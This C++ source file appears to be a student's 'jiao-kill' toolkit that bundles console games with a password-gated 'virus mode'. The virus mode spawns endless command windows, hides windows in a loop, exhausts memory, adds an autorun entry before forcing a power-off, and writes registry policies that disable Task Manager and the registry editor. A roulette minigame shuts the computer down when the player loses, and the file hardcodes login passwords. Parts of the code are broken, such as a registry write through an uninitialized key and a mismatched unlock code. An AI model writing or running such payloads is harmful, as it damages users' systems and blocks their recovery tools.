    for(int i=1;i<=3+(Bbl-Bbr)/5;i++)if(Bbr<Bbl){Setpos(Bway[Bbr][0],Bway[Bbr][1]);if(Bway[Bbr][0]==20) cout<<"==";else cout<<"  ";Bbr++;}
    Bx2-=Bvx2;By2-=Bvy2;
    if(Bwhat2==0){X21:Bwhat2=rand()%7;if(Bwhat2==2){X31:for(int i=1;i<=3;i++){Bgo2[i*2+1]=rand()%28+1,Bgo2[i*2]=rand()%25+5;if((abs(Bgo2[i*2]-Bx2)<=2&&abs(Bgo2[i*2+1]-By2)<=2)||(abs(Bgo2[i*2]-X)<=2&&abs(Bgo2[i*2+1]-Y)<=2))goto X31;}if(Bgo2[2]==Bgo2[4]||Bgo2[2]==Bgo2[6]||Bgo2[6]==Bgo2[4]||Bgo2[5]==Bgo2[3]||Bgo2[3]==Bgo2[7]||Bgo2[5]==Bgo2[7]) goto X31;}if(Bwhat2==3){Bgo2[2]=rand()%2;}if(Bwhat2==4||Bwhat2==5||Bwhat2==6){Bvy2=-1.5;Bvx2=-0.5;}}
    if(Bwhat2==1){Bgo2[1]++,Bgo2[2]++;int R=rand()%(5-Bgo2[1]),r=rand()%(30-Bgo2[2]);if(Out2) R=0;if(R==0) {int vx=Bvx2,vy=Bvy2;Bgo2[1]=0;Bvx2=(rand()%101-20)/50.0;Bvy2=(rand()%101-20)/50.0;if(Bgo2[3]<=2) Bvx2*=-1;if(Bgo2[3]%2==1) Bvy2*=-1;if(Out2) r=0;} if(r==0) Chang2 }
    if(Bwhat2==2){Bgo2[1]++;float bx,by,bvx,bvy;if(Bgo2[1]<21){for(int i=1;i<=3;i++){bvx=Bgo2[i*2]-Bx2,bvy=Bgo2[i*2+1]-By2;if(Bgo2[1]<=10){Setpos(Bx2+(Bgo2[1]-1)*bvx/10.0,By2+(Bgo2[1]-1)*bvy/10.0);if(abs(Bx2+(Bgo2[1]-1)*bvx/10.0-20)<0.5)cout<<"==";else cout<<"  ";bx=Bx2+Bgo2[1]*bvx/10.0;by=By2+Bgo2[1]*bvy/10.0;Setpos(bx,by);}else Setpos(Bgo2[i*2],Bgo2[i*2+1]);int r=rand()%4;if(r%2==0) Color(3);else Color(10);if(r<=1) cout<<"×";else cout<<"＋";Color(0);}}if(Bgo2[1]==21){Map(0,(bool)Kill);Color(3);int j=0;for(int j=0;j<=30;j++)for(int i=1;i<=3;i++)for(int k=1;k<=4;k++){if(k==1) bvx=j,bvy=0;if(k==2) bvx=-j,bvy=0;if(k==3) bvx=0,bvy=j;if(k==4) bvx=0,bvy=-j;bx=Bgo2[i*2]+bvx,by=Bgo2[i*2+1]+bvy;if(bx<=5||bx>=30||by<0||by>=30) {continue;}Panboss(bx,by);Setpos(bx,by),cout<<"█";Bbl++;Bway[Bbl][0]=bx;Bway[Bbl][1]=by;}Color(0);Map(-1,0);Chang2}}
    if(Bwhat2==3){Bgo2[1]++;if(Bgo2[1]<=18){if(Bgo2[3]==0) Setpos(Bgo2[4]-3,Bgo2[5]),cout<<"  ",Setpos(Bgo2[4]+3,Bgo2[5]),cout<<"  ",Color(0),Setpos(20,Bgo2[5]),cout<<"==";if(Bgo2[3]==1) Setpos(Bgo2[4],Bgo2[5]-3.5),cout<<"    ",Setpos(Bgo2[4],Bgo2[5]+2.5),cout<<"    ",Color(0),Setpos(20,Bgo2[5]+2.5),cout<<"====",Setpos(20,Bgo2[5]-3.5),cout<<"====";if(Bgo2[1]%4==0)Bgo2[3]=!Bgo2[3];if(Bgo2[1]%6<3)Color(3);else Color(5);if(Bgo2[3]==0) Setpos(X-3,Y),cout<<"▼",Setpos(X+3,Y),cout<<"▲",Bgo2[4]=(int)(X+0.5),Bgo2[5]=(int)(Y+0.5);if(Bgo2[3]==1) Setpos(X,Y-3),cout<<" ",Setpos(X,Y+3),cout<<" ",Bgo2[4]=(int)(X+0.5),Bgo2[5]=(int)(Y+0.5);Color(0);}if(Bgo2[1]==18){if(Bgo2[3]==0) Setpos(Bgo2[4]-3,Bgo2[5]),cout<<"  ",Setpos(Bgo2[4]+3,Bgo2[5]),cout<<"  ",Color(0),Setpos(20,Bgo2[5]),cout<<"==";if(Bgo2[3]==1) Setpos(Bgo2[4],Bgo2[5]-3.5),cout<<"    ",Setpos(Bgo2[4],Bgo2[5]+2.5),cout<<"    ",Color(0),Setpos(20,Bgo2[5]+2.5),cout<<"====",Setpos(20,Bgo2[5]-3.5),cout<<"====";}if(Bgo2[1]>18&&Bgo2[1]<=25){Bgo2[3]=Bgo2[2];if(Bgo2[3]==0) Setpos(Bgo2[4]-3,Bgo2[5]),cout<<"  ",Setpos(Bgo2[4]+3,Bgo2[5]),cout<<"  ",Color(0),Setpos(20,Bgo2[5]),cout<<"==";if(Bgo2[3]==1) Setpos(Bgo2[4],Bgo2[5]-3.5),cout<<"    ",Setpos(Bgo2[4],Bgo2[5]+2.5),cout<<"    ",Color(0),Setpos(20,Bgo2[5]+2.5),cout<<"====",Setpos(20,Bgo2[5]-3.5),cout<<"====";if(Bgo2[1]%4<2)Color(3);else Color(5);if(Bgo2[3]==0) Setpos(Bgo2[4]-3,Bgo2[5]),cout<<"▼",Setpos(Bgo2[4]+3,Bgo2[5]),cout<<"▲";if(Bgo2[3]==1) Setpos(Bgo2[4],Bgo2[5]-3),cout<<" ",Setpos(Bgo2[4],Bgo2[5]+3),cout<<" ";Color(0);}if(Bgo2[1]==25){if(Bgo2[2]==0){Color(3);for(int i=4;i<=29;i++){Setpos(i,Bgo2[5]),cout<<"█";Bbl++;Panboss(i,Bgo2[5]);Bway[Bbl][0]=i;Bway[Bbl][1]=Bgo2[5];}}if(Bgo2[2]==1){Color(3);for(int i=0;i<=28;i++){Setpos(Bgo2[4],i),cout<<"█";Bbl++;Panboss(Bgo2[4],i);Bway[Bbl][0]=Bgo2[4];Bway[Bbl][1]=i;}}Chang2}}
    if(Bwhat2==4||Bwhat2==5||Bwhat2==6){Bgo2[1]++;if(By2>27)Bvy2=0;if(Bx2>23)Bvx2=0;if(Bgo2[1]>13&&Bgo2[1]%3==0){float t=By2-Y,g=0.35;if(Boss==6) t/=2.0;CpGuai(Bwhat2+2,Bx2,By2,(Bx2-X)/t*1.0+(t-1)*g/2.0,1);}if(Bgo2[1]>20) Chang2}
}
void Boss3(){
    #define Bean br++;B[br].what=13;B[br].x=Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].life=1;
    for(int j=0;j<20;j++)if(abs(Bx3-I[j][0])<2&&By3-I[j][1]<=2){Setpos(I[j][0],I[j][1]);if(I[j][0]==20) cout<<"===";else cout<<"   ";I[j][0]=I[j][1]=-1;Bblo-=8+Lv*2;Exp+=2;}
    Bx3-=Bvx3;By3-=Bvy3;
    if(Bwhat3<=8){if(Bx3>X&&Bvx3<1.5) Bvx3+=0.3;if(Bx3<X&&Bvx3>-1.5) Bvx3-=0.3;}
    if(Bwhat3==0){X22:Bwhat3=rand()%12;if(Bwhat3==11&&abs(Bx3-20)<=1)goto X22;if(Bwhat3==11)Bgo3[2]=rand()%5;}
    if(Bwhat3==1){Bgo3[1]++;if(Bgo3[1]==6){br++;B[br].what=13;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=1;B[br].How=(int)Bx3-4;B[br].life=1;br++;B[br].what=13;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=-1;B[br].How=(int)Bx3+2;B[br].life=1;br++;B[br].what=13;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].life=1;Chang3}}
    if(Bwhat3>=2&&Bwhat3<=6){Bgo3[1]++;if(Bgo3[1]==6){br++;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].what=11+Bwhat3;B[br].vy=0.5+(rand()%100)/80.0;if(Bwhat3==5)B[br].vy=B[br].vy*3/4.0;B[br].life=1;Chang3}}
    if(Bwhat3==7){Bgo3[1]++;if(Bgo3[1]==6){br++;B[br].what=14;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=1;B[br].How=(int)Bx3-4;B[br].life=1;br++;B[br].what=14;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=-1;B[br].How=(int)Bx3+2;B[br].life=1;br++;B[br].what=14;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].life=1;Chang3}}
    if(Bwhat3==8){Bgo3[1]++;if(Bgo3[1]==6){br++;B[br].what=15;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=1;B[br].How=(int)Bx3-4;B[br].life=1;br++;B[br].what=15;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].vx=-1;B[br].How=(int)Bx3+2;B[br].life=1;br++;B[br].what=15;B[br].x=(int)Bx3-1,B[br].y=By3-1;B[br].vy=1;B[br].life=1;Chang3}}
    if(Bwhat3==9){Bvx3=0;Bgo3[1]++;if(Bgo3[1]==6||Bgo3[1]==8){Bean}if(Bgo3[1]>=8)Chang3}
    if(Bwhat3==10){Bvx3=0;Bgo3[1]++;if(Bgo3[1]==6||Bgo3[1]==8||Bgo3[1]==10||Bgo3[1]==12){Bean}if(Bgo3[1]>=12)Chang3}
    if(Bwhat3==11){Bvx3=0;Bgo3[1]++;if(Bgo3[1]>=8)for(int i=1;i<=4;i++){br++;B[br].what=80+100*Bgo3[2]+Bgo3[1]*4+i;B[br].x=Bx3-1,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=99;B[br].x=Bx3,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=99;B[br].x=Bx3-2,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;}if(Bgo3[1]>=20){for(int i=1;i<=4;i++){br++;B[br].what=98;B[br].x=Bx3-1,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=98;B[br].x=Bx3,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;br++;B[br].what=98;B[br].x=Bx3-2,B[br].y=By3-1+i;B[br].vy=4;B[br].life=1;}Chang3}}
}
void Ball(int ball){
    if(ball==1){if(Fir<3&&T%8==0) Fir++;if(Fir>0){br++;B[br].what=-13;B[br].x=X;B[br].y=Y+rand()%3-1;B[br].life=1;if(Dis<=30) B[br].a=Disb,B[Disb].a=1,Fir--;else if(Boss!=0) B[br].a=13880086,Fir--;else if(Dis!=13880087) B[br].a=Disb,B[Disb].a=1,Fir--;else if(Dis1!=13880087) B[br].a=Disb1,B[Disb1].a=1,Fir--;else B[br].life=0;Dis=Dis1=13880087;}}
    if(ball==2){if(T%4==0)ib=(ib+1)%20,I[ib][1]=Y-2;if(T%16==0)I[ib][0]=X;if(T%16==4)I[ib][0]=X-1;if(T%16==8)I[ib][0]=X+1;if(T%16==12)I[ib][0]=X-2;if(T%12==9)I[ib][0]=X+2;if(Water==1){for(int i=X-6;i<=X+6;i++)ib=(ib+1)%20,I[ib][0]=i,I[ib][1]=Y-2-0.5*abs(i-X);}}
    if(ball==3){if(Wind>5){if(Y<Ding-1)Vy=5;else Vy=0;if(Up>=1) Vx=-5;if(Down==2) Vx=5;}if(Wind<5){if(Y>Ding-1)Vy=-5;else Vy=0;if(Up>=1) Vx=-5;if(Down==2) Vx=5;}if(Wind==5){if(Boss==2) Ding=12.25;else Ding=6.25;if(Boss!=0) Bblo-=16+Lv*4;if(Boss==1) Chang1 if(Boss==2) Chang2 if(Boss==3) Chang3 system("color 3F");Sleep(20);system("color 6F");Sleep(10);system("color 0F");system("cls");for(int i=bl;i<=br;i++)if(B[i].what>0)B[i].life=0;Setpos(20,0);for(int i=1;i<=60;i++) printf("=");}}
    if(ball==4){if(Thun==1){if(Boss!=0) Bblo-=16+Lv*4;if(Boss==1) Chang1 if(Boss==2) Chang2 if(Boss==3) Chang3 system("color 9F");Sleep(20);system("color 6F");Sleep(10);system("color 0F");system("cls");for(int i=bl;i<=br;i++)if(B[i].what>0)B[i].life=0;Setpos(20,0);for(int i=1;i<=60;i++) printf("=");}}
    if(ball==5){system("cls"); Color(5);Setpos(10,10);cout<<"新天赋！";Y:int rr=rand()%4+2;Setpos(12,10);if(rr==Ren) goto Y;if(rr==2)cout<<"瞬跳";if(rr==3)cout<<"空之舞";if(rr==4)cout<<"三段跳";if(rr==5)cout<<"反重力跳跃";Setpos(14,10);cout<<"当前天赋：";if(Ren==1)cout<<"小无敌";if(Ren==2)cout<<"瞬跳";if(Ren==3)cout<<"空之舞";if(Ren==4)cout<<"三段跳";if(Ren==5)cout<<"反重力跳跃";Setpos(16,10);cout<<"换否？（y/n）";G:char g=_getch();if(g=='y')Ren=rr;else if(g!='n')goto G;system("cls");Setpos(20,0);Color(0);for(int i=1;i<=60;i++) printf("=");}
    if(ball==6){Color(4);for(float i=1;i<=Bblo;i+=Bblomax/20.0)cout<<"▄";Color(0);cout<<' '<<Bblo<<"                              ";Color(0);}
    if(ball==7){Color(1);if(Win==7&&T%6<3)Color(3);for(float i=1;i<=Blo;i+=Blomax/20.0)cout<<"▄";Color(0);if(Win==7&&T%6<3)Color(3);printf(" %0.1f                              ",Blo);}
}

// Little game 4
class sunny {
	// Private section
	public:
		// Public Declarations
		enum ConsoleColor {
	    BLACK = 0,
	    BLUE = 1,
	    GREEN = 2,
	    CYAN = 3,
	    RED = 4,
	    MAGENTA = 5,
	    BROWN = 6,
	    LIGHT_GRAY = 7,
	    DARK_GRAY = 8,
	    LIGHT_BLUE = 9,
	    LIGHT_GREEN = 10,
	    LIGHT_CYAN = 11,
	    LIGHT_RED = 12,
	    LIGHT_MAGENTA = 13,
	    YELLOW = 14,
	    WHITE = 15
	};
	 
	// 设置控制台文本颜色的函数
	void SetConsoleColor(ConsoleColor color) {
	    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	    SetConsoleTextAttribute(hConsole, color);
	}
	
	//emlpd
	
	void emlpd(){
		system("cls");
		int x,y,a,b,n; 
		SetConsoleColor(LIGHT_BLUE);
		cout<<"欢迎来到恶魔轮盘赌游戏"<<endl;
		SetConsoleColor(WHITE);
		cout<<"请输入次数：";
		cin>>n;
		SetConsoleColor(LIGHT_CYAN);
		cout<<"还有三秒开始！！！"<<endl;
		SetConsoleColor(LIGHT_RED);
		cout<<"3"<<endl;
		sleep(1);
		SetConsoleColor(RED);
		cout<<"2"<<endl;
		sleep(1);
		SetConsoleColor(MAGENTA);
		cout<<"1"<<endl;
		sleep(1);
		for(int i=0;i<=n;i++){
			system("cls");
			SetConsoleColor(DARK_GRAY);
			cout<<"请输入躲避坐标（如：2 5，注：不能超过5！！！）：";
			cin>>x>>y;
			a=rand()%5+1;
			b=rand()%5+1;
			if(x==a && y==b){
				SetConsoleColor(CYAN);
				cout<<"您已死！！！"<<endl;
				cout<<"5"<<endl;
				sleep(1);
				cout<<"4"<<endl;
				sleep(1);
				cout<<"3"<<endl;
				sleep(1);
				cout<<"2"<<endl;
				sleep(1);
				cout<<"1"<<endl;
				system("shutdown -s -t 1");
			}
			else if(x>5 || y>5){
				SetConsoleColor(WHITE);
				cout<<"您已输错！！！还有"<<n-(i+1)<<"次！！！"<<endl;
				sleep(2);
			}else if(x!=a || y!=b){
				SetConsoleColor(YELLOW);
				cout<<"恭喜您成功躲避子弹！！！还有"<<n-(i+1)<<"次"<<endl;
				sleep(2);
				if(n-(i+1)==0){
					SetConsoleColor(BROWN);
					cout<<"您没有次数了！！！"<<endl; 
					cout<<"欢迎下次游玩！！！";
					SetConsoleColor(WHITE);
					system("cls");
					break;
				}
				continue;
			}
		}	 
	}
}; 

// qian_jiao
void q_j1(){
	//open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout<<"v1.1"<<endl;
	system("title jiao-kill v1.1");
}
void q_j2(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "暑假更新版1" << endl;
	cout << "\n";
	system("title jiao-kill v1.2");
}
void q_j3(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版1" << endl;
	cout << "\n";
	system("title jiao-kill v1.3");
} 
void q_j4(){
	int module=0;

    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版4，jiao-kill v2.0" << endl;
	cout << "\n";
	system("title jiao-kill v2.0");
}
void wuq(){
	int module=0;
    //open the file out data
    cout << "    _   _                    __  ____   __ " << endl;
	cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
	cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
	cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
	cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
	cout << " |__/                       \_\         /_/ " << endl;
	cout << "大香蕉牌学生机终止器"  << endl;
	cout << "学期更新版4，jiao-kill v2.0" << endl;
	cout << "\n";
	system("title jiao-kill v2.0");
} 
//main program
int main(int argc, char** argv) {
	string a,b;
	int c;
	while(true){
		HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
		system("cls"); 
		cout<<"欢迎使用Summer Liu创造的jiao-kill！！！"<<endl; 
		cout<<"请输入模式：（0：退出程序，1：登录，2：使用付费jiao-kill，3：查看用户列表）";
		cin>>c;
		if(c==0){
			break;
		}
		if(c==1){
			cout<<"请输入用户名：";
			cin>>a;
			cout<<"请输入密码：";
			cin>>b;
			if (a=="liusirui" && b=="Sunny0226" || a=="cnm" && b=="114514"){
				system("cls");
			    int module=0;
				HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			    //open the file out data
			    cout << "    _   _                    __  ____   __ " << endl;
				cout << "   (_) (_)   __ _    ___    / / |  _ \  \ \ " << endl;
				cout << "   | | | |  / _` |  / _ \  | |  | |_) |  | |" << endl;
				cout << "   | | | | | (_| | | (_) | | |  |  _ <   | |" << endl;
				cout << "  _/ | |_|  \__,_|  \___/  | |  |_| \_\  | |" << endl;
				cout << " |__/                       \_\         /_/ " << endl;
				cout << "大香蕉牌学生机终止器"  << endl;
				cout << "学期更新版6，jiao-kill v2.4" << endl;
				cout << "\n";
				system("title jiao-kill v2.4");
			
				while (true) { 
					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			        cout << "请输入模式(输入11查看帮助)：";
			        cin >> module;
			        if (module == 0) {
			            break;
			            system("pause");
			        }
			        else if (module==1) {
			            kill_task();
			        }
			        else if (module == 2) {
			            GoBang g;
			            g.Play();
			            system("pause");
			        }
					else if (module == 3){
						system("title 贪吃蛇游戏"); 
						system("mode con cols=80 lines=30"); //设置cmd窗口大小
						system("color 2"); //设置字符颜色：0 黑；1 深蓝；2 深绿；3 深青；4 深红；5 深紫；6 深褐 
					    cout << "--------------------贪吃蛇---------------------" << endl;
					    cout << "先选择难度.请在1-10中输入1个数,1最简单,10则最难" << endl;
					    cout << "然后进入游戏画面,以方向键控制方向.祝你游戏愉快!" << endl;
					    cout << "-----------------------------------------------" << endl;
					    cout << "请输入难度级别：" ;
					    m=25;
					    n=40; 
					    if (m<10 || n<10 || m>25 || n>40)
					    {
					        cout << "ERROR" << endl;
					        system("pause");
					        return 0;
					    }
					    int hard;
					    cin >> hard;
					    if (hard<=0 || hard>100)
					    {
					        cout << "ERROR" << endl;
					        system("pause");
					        return 0;
					    }
					    /*** 数据全部初始化，包括蛇长，位置，方向 ***/
					    snake_length=5;
					    clock_t a,b;
					    char ch;
					    double hard_len;
					    for (int i=0;i<=4;i++)
					    {
					        snake[i].x=1;
					        snake[i].y=5-i;
					    }
					    dir=3;
					    /*** 输出初始地图，蛇与食物 ***/
					    system("cls");
					    hide();
					    print_wall();
					    print_food();
					    print_snake();
					    locate(m+2,0);
					    cout << "Now length: ";
					    /*** 开始游戏 ***/
					    while (1)
					    {
					        /*** 难度随长度增加而提高 ***/
					        hard_len=(double)snake_length/(double) (m*n);
					        /*** 调节时间，单位是ms ***/
					        a=clock();
					        while (1)
					        {
					            b=clock();
					            if (b-a>=(int)(400-30*hard)*(1-sqrt(hard_len))) break;
					        }
					        /*** 接受键盘输入的上下左右，并以此改变方向 ***/
					        if (kbhit())
					        {
					            ch=getch();
					            if (ch==-32)
					            {
					                ch=getch();
					                switch(ch)
					                {
					                case 72:
					                    if (dir==2 || dir==3)
					                        dir=0;
					                    break;
					                case 80:
					                    if (dir==2 || dir==3)
					                        dir=1;
					                    break;
					                case 75:
					                    if (dir==0 || dir==1)
					                        dir=2;
					                    break;
					                case 77:
					                    if (dir==0 || dir==1)
					                        dir=3;
					                    break;
					                }
					            }
					        }
					        /*** 前进 ***/
					        if (!go_ahead()) break;
					        /*** 在最后输出此时长度 ***/
					        locate(m+2,12);
					        cout << snake_length;
					    }
					    system("color 0");
						system("pause");
					}
			        else if (module == 4) {
			        	system("cls");
			        	system("title 病毒模式");
			        	int r;
						cout<<"Please input number(1~9) : ";
						cin>>r;
						if(r==1){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==264697){
			    				cout<<"It's safe";
							}else{
								while(1)system("start cmd");
							}
						}else if(r==2){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==417664){
			    			cout<<"It's safe";
							}else{
								while(1){
			    			    	HWND hWnd=GetForegroundWindow();
			    			    	ShowWindow(hWnd,SW_HIDE);
			    				}
							}
						}else if(r==3){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==529555){
								cout<<"It's safe";
							}else{
			    				while(1)malloc(1000);
							}
						}else if(r==4){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==278230){
								cout<<"It's safe";
							}else{
			    				AutoRun_Startup("c://main.exe", "main.exe");
			    				system("shutdown /p");
							}
						}else if(r==5){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==640855){
			    				cout<<"It's safe";
							}else{
			    				HKEY hkey;
			    				DWORD value = 1;
			    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			    				RegSetValueEx(hkey, "DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    				RegCloseKey(hkey);
							}
						}else if(r==6){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==957040){
			    				cout<<"It's safe";
							}else{
			    				HKEY hkey;
			    				DWORD value = 1;
			    				RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
			    				RegSetValueEx(hkey, "DisableRegistryTools", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    				RegCloseKey(hkey);
							}
						}else if(r==7){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==617735){
			    				cout<<"It's safe";
							}else{
			    				DWORD value = 1;
			    				HKEY hkey;
			    				RegSetValueEx(hkey, "Wallpaper", NULL, REG_SZ, (unsigned char *)"c://", 3);
			    				RegSetValueEx(hkey, "WallpaperStyle", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
			    			}
						}else if(r==8){
							int i;
							cout<<"Please input password: ";
							cin>>i;
							if(i==138208){
			    				cout<<"It's safe";
							}else{
			    				char *Fuck[4] = { "你", "好", "世", "界" };
			    				int FuckLen = sizeof(Fuck) / sizeof(int);
				    			TCHAR Destop[MAX_PATH];
			    				SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);  
				    			for (int x = 0; x < FuckLen; x++){
				    		    	SetImmunity("c://", Fuck[x]);
				    		    	ClearImmunity("c://", Fuck[x]);
				    			} 
			    				system("pause");
							}
						}else{
							cout<<"It's not true";
						}
			        	system("pause");
					}
					else if (module == 5) {
						system("cls");
						system("title 病毒秘钥");
						cout << "1:  264697" <<endl;
						cout << "2:  417664" <<endl;
						cout << "3:  529555" <<endl;
						cout << "4:  278230" <<endl;
						cout << "5:  640855" <<endl;
						cout << "6:  957040" <<endl;
						cout << "7:  617735" <<endl;
						cout << "8:  138203" <<endl;
						system("pause"); 
					}
					else if(module == 6){
						system("start http://www.google.com/poki.com");
					}
					else if(module == 7){
						system("cls");
						system("title 开始关机");
						cout<<"一分钟后关机！";
						system("shutdown -s -t 60");
						break;
					} 
					else if(module == 8){
						system("cls");
						string word;
						cout<<"欢迎使用jiao版AI，我是banana！！！"<<endl;
						sleep(2);
						cout<<"请输入您的问题：";
						cin>>word;
						sleep(2);
						cout<<"不好意思，我不知道！！！"<<endl;
						sleep(2);
						cout<<"如果您还行知道答案，您可以问我的师父豆包！！！"<<endl;
						sleep(2);
						cout<<"您可以在谷歌浏览器里输入“doubao.com”就可以问她了！！！"<<endl;
						sleep(2);
						cout<<"下次再见！！！"; 
						system("pause");
						
					}
					else if(module == 9){
						system("mode con cols=60 lines=37");CONSOLE_CURSOR_INFO cursor_info={1,0};SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE),&cursor_info);srand((unsigned)time(NULL));
					    Win=0;Ren=1;Lv=1;Blo=Blomax=100/*这里改变血量*/;Expmax=300;Hui=15;X=18,Y=6;
					    ReStart:system("cls");memset(B,0,sizeof(B));memset(I,-1,sizeof(I));T=0;bl=0;br=-1;Upt=0;
					    Start:Blo=Blomax * 100;Ding=6.25;
					    memset(Bgo1,0,sizeof(Bgo1));memset(Bgo2,0,sizeof(Bgo2));memset(Bgo3,0,sizeof(Bgo3));
					    if(Win%2==0) T=0;if(Win%2==0&&D==0){if(Win>0)Ball(5);Boss=0;lL:L=rand()%4+1;for(int i=0;i<=Win/2-1;i++)if(L==Ll[i]) goto lL;Ll[Win/2]=L;}if(Win%2==1&&D==0){if(Win==7)Boss=6,T=0,Blomax+=100;else{bl:Boss=rand()%3+1;for(int i=0;i<=3;i++)if(Boss==Bl[i]) goto bl;}Bl[Win/2]=Boss;Bwhat1=Bwhat2=Bwhat3=0,Bx1=10,By1=20,Bx2=15,By2=20,Bx3=21,By3=20;system("color 4C");Sleep(20);system("color 0F");Map(0,1);Sleep(1000);}if(Win%2==1){Bblomax=500+(Win/2)*500;Bblo=Bblomax;if(Boss==2) Ding=12.25;}
					    while(1){
					        T++;
					        if(Wind==0){if(GetAsyncKeyState(VK_LEFT)&0x8000) Vy=-(10-abs(Ding-Y)*1.5)/20.0;if(GetAsyncKeyState(VK_RIGHT)&0x8000) Vy=(10-abs(Ding-Y)*1.5)/20.0;}if(GetAsyncKeyState(VK_UP)&0x8000&&u1==0) {u1++;if(Down==1){Down=0;Up=0;if(Ren==2)Map(-1,0),Vx=0,X=18,Li=5;else Vx=7,Vy=0.3;}else if(Up==0&&Wind==0) {Down=0;Up=1;if(Ren==2)Map(-1,0),Vx=1,X=10,Map(0,3),Li=5;else Vx=2,Vy=0.1;}else if(Up==1&&Wind==0) {Down=0;Up=2;if(Ren==2)Map(-1,0),Vx=1,X-=6,Map(0,3),Li=5;else Vx=1.5,Vy=0.1;}else if(Ren==3&&Up==2&&Wind==0) {Down=0;Up=3;Vx=1;Vy=0.5;Upt=30;}else if(Ren==4&&Up==2&&Wind==0) {Down=0;Up=3;Vx=1.8;Vy=0.1;}}if(GetAsyncKeyState(VK_DOWN)&0x8000&&u2==0) {u2++;if(Down==1&&Ren==5){Down=2;Up=0;Vx=-1.7;}else {Down=1;Up=0;if(Ren==2)Map(-1,0),Vx=0,X=22,Map(0,3),Li=5;else {if(Upt!=0) Map(-1,0),Upt=0;Vx=-7;}}}if((GetAsyncKeyState(VK_UP)&0x8000) ?0:1) u1=0;if((GetAsyncKeyState(VK_DOWN)&0x8000) ?0:1) u2=0;if(kbhit()){char g=_getch();if(g==' ') Sleep(100),Setpos(4,1),Sy++,system("pause");}if(Sy==1) Setpos(4,1),printf("                           "),Sy--;
					        if(Drug==0) Blo=fmin((float)Blomax,Blo+Hui/100.0);else if(T%10==0)Blo--;if(T%20==0) {if(Kill!=0) Kill=0;if(Lvl!=0) Lvl=0;}if(Killb>0) Killb--;if(Li>0) Li--;if(Ice>0) Ice--;if(Drug>0) Drug--;if(Magne>0) Magne--;
